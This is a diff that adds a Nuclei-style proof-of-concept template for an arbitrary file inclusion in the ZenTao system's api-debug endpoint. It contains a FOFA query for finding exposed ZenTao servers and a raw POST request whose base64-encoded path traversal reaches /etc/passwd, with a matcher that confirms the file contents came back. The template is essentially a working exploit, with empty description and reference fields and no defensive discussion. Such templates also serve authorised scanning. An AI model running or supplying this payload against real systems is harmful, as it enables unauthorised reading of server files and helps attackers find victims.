@@ -1,0 +1,36 @@
+id: poc-local-zentao-api-debug-include-file
+
+info:
+  name: poc-local-zentao-api-debug-任意文件包含
+  author: capiton
+  severity: high
+  description: ""
+  reference:
+    - ""
+  metadata:
+    fofa-query: 'app="易软天创-禅道系统"'
+    Vulnerability-Impact: ""
+  tags: zentao
+
+requests:
+  - raw:
+      - |-
+        POST /zentao/api-debug-Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjLy4vcGFzc3dkL3Bhc3N3ZA==-extendControl-1.html HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{RootURL}}/zentao/user-login.html
+        Accept-Encoding: gzip
+
+        
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: linux
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
+        condition: and
